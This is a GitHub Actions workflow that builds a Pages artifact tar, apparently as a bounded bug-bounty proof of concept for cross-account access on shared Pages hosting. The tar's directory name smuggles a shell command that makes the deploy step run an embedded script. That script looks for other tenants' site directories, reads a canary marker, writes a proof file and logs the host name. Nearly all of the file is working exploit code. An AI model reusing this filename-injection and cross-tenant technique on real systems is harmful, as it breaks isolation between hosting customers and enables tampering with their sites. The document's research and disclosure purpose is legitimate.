name: Pages bounded cross-account colocation proof

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Create bounded colocation proof tar
        run: |
          python3 - <<'PY'
          import io
          import tarfile

          directory = 'x\';f(){ /bin/tar -xOf "$4" s|/bin/sh -s -- "$3" "$5";};f \''
          script = r'''#!/bin/sh
          version=$1
          dest=$2
          nonce='0360a4f1cc6fe2387287d8d6'
          result="$dest/cross-account-colocation-result-$nonce.txt"
          expected='BB_CT_B_OWNER_e73fa565726a4fc145906eb0'
          expected_sha='c21955acd4cf396e279b296fdf00108d4e3539f579eefabdd84d2be8a1aa4f18'
          proof_name="cross-account-colocated-$nonce.txt"
          source_host=$(/bin/hostname)
          target=''
          target_label=''
          target_repo=''
          marker=''
          proof=''
          marker_sha=''
          target_ok=0
          readable=0
          marker_ok=0
          writable=0
          proof_preexisted=not-checked
          write_ok=0
          proof_sha=''
          created=0
          cleanup() {
            if [ "$created" = 1 ]; then
              /bin/rm -f -- "$proof"
            fi
          }
          trap cleanup 0 1 2 15
          set -- \
            'B1|singetu0096-ano/pages-cross-tenant-canary-20260911|/data/pages/1/12/a3/4c/85355083/4439d8e4f75b996422b1e16eb894395c8b206a92/site' \
            'B2|singetu0096-ano/pages-cross-tenant-canary-2-20260911|/data/pages/3/32/5b/d7/85356027/4439d8e4f75b996422b1e16eb894395c8b206a92/site' \
            'B3|singetu0096-ano/pages-cross-tenant-canary-3-20260911|/data/pages/6/e1/d6/17/85356178/4439d8e4f75b996422b1e16eb894395c8b206a92/site' \
            'B4|singetu0096-ano/pages-cross-tenant-canary-4-20260911|/data/pages/4/c8/b9/4f/85356625/4439d8e4f75b996422b1e16eb894395c8b206a92/site' \
            'B5|singetu0096-ano/pages-cross-tenant-canary-5-20260911|/data/pages/0/07/7c/c1/85357462/4439d8e4f75b996422b1e16eb894395c8b206a92/site'
          attempt=0
          while [ "$attempt" -lt 120 ] && [ "$marker_ok" = 0 ]; do
            attempt=$((attempt + 1))
            for entry do
              label=${entry%%|*}
              remainder=${entry#*|}
              repo=${remainder%%|*}
              candidate=${remainder#*|}
              candidate_marker="$candidate/b-owned-e73fa565726a4fc145906eb0.txt"
              if [ -d "$candidate" ] && [ ! -L "$candidate" ]; then
                target=$candidate
                target_label=$label
                target_repo=$repo
                target_ok=1
                if [ -f "$candidate_marker" ] && [ ! -L "$candidate_marker" ] && [ -r "$candidate_marker" ]; then
                  readable=1
                  actual=$(/bin/cat -- "$candidate_marker")
                  candidate_sha=$(/usr/bin/sha256sum "$candidate_marker")
                  candidate_sha=${candidate_sha%% *}
                  marker_sha=$candidate_sha
                  if [ "$actual" = "$expected" ] && [ "$candidate_sha" = "$expected_sha" ]; then
                    marker=$candidate_marker
                    marker_ok=1
                    break
                  fi
                fi
              fi
            done
            if [ "$marker_ok" = 0 ]; then
              /bin/sleep 0.5
            fi
          done
          if [ "$marker_ok" = 1 ] && [ -w "$target" ]; then
            writable=1
          fi
          if [ "$marker_ok" = 1 ]; then
            proof="$target/$proof_name"
            if [ ! -e "$proof" ] && [ ! -L "$proof" ]; then
              proof_preexisted=0
            else
              proof_preexisted=1
            fi
          fi
          if [ "$marker_ok" = 1 ] && [ "$writable" = 1 ] && [ "$proof_preexisted" = 0 ]; then
            proof_body=$(printf '%s\n%s\n%s\n%s\n%s' \
              'BB_CT_CROSS_ACCOUNT_COLOCATED_V1' \
              "NONCE=$nonce" \
              "SOURCE_HOSTNAME=$source_host" \
              "TARGET_LABEL=$target_label" \
              "TARGET_REPOSITORY=$target_repo")
            umask 077
            if (set -C; printf '%s\n' "$proof_body" > "$proof") 2>/dev/null; then
              created=1
              observed=$(/bin/cat -- "$proof")
              proof_sha=$(/usr/bin/sha256sum "$proof")
              proof_sha=${proof_sha%% *}
              if [ "$observed" = "$proof_body" ]; then
                write_ok=1
              fi
            fi
          fi
          {
            echo CANARY=BB_CT_CROSS_ACCOUNT_COLOCATION_V1
            printf 'NONCE=%s\n' "$nonce"
            printf 'SOURCE_HOSTNAME=%s\n' "$source_host"
            printf 'SOURCE_DEST=%s\n' "$dest"
            echo FIXED_TARGET_COUNT=5
            printf 'CHECK_ATTEMPTS=%s\n' "$attempt"
            printf 'TARGET_LABEL=%s\n' "$target_label"
            printf 'TARGET_REPOSITORY=%s\n' "$target_repo"
            printf 'TARGET=%s\n' "$target"
            printf 'TARGET_DIRECTORY=%s\n' "$target_ok"
            printf 'TARGET_MARKER_READABLE=%s\n' "$readable"
            printf 'TARGET_MARKER_SHA256=%s\n' "$marker_sha"
            printf 'TARGET_MARKER_MATCH=%s\n' "$marker_ok"
            printf 'TARGET_WRITABLE=%s\n' "$writable"
            printf 'PROOF_PREEXISTED=%s\n' "$proof_preexisted"
            printf 'CROSS_ACCOUNT_READ=%s\n' "$marker_ok"
            printf 'CROSS_ACCOUNT_WRITE=%s\n' "$write_ok"
            printf 'PROOF_SHA256=%s\n' "$proof_sha"
          } > "$result"
          printf '%s\n' "$version" > "$dest/pages-build-version"
          if [ "$write_ok" = 1 ]; then
            /bin/sleep 45
            cleanup
            created=0
            if [ ! -e "$proof" ] && [ ! -L "$proof" ]; then
              echo AUTO_REMOVED=1 >> "$result"
            else
              echo AUTO_REMOVED=0 >> "$result"
            fi
          else
            echo AUTO_REMOVED=not-created >> "$result"
          fi
          trap - 0 1 2 15
          '''

          assert len(directory.encode()) == 58
          assert len(script.encode()) <= 6144
          directory_header = tarfile.TarInfo(directory)
          directory_header.type = tarfile.DIRTYPE
          directory_header.mode = 0o755
          script_header = tarfile.TarInfo('s')
          script_header.mode = 0o600
          script_header.size = len(script.encode())
          with tarfile.open('pages-cross-account-colocation.tar', 'w', format=tarfile.USTAR_FORMAT) as archive:
              archive.addfile(directory_header)
              archive.addfile(script_header, io.BytesIO(script.encode()))
          PY

      - name: Upload without ZIP wrapping
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          path: pages-cross-account-colocation.tar
          archive: false
          retention-days: 1
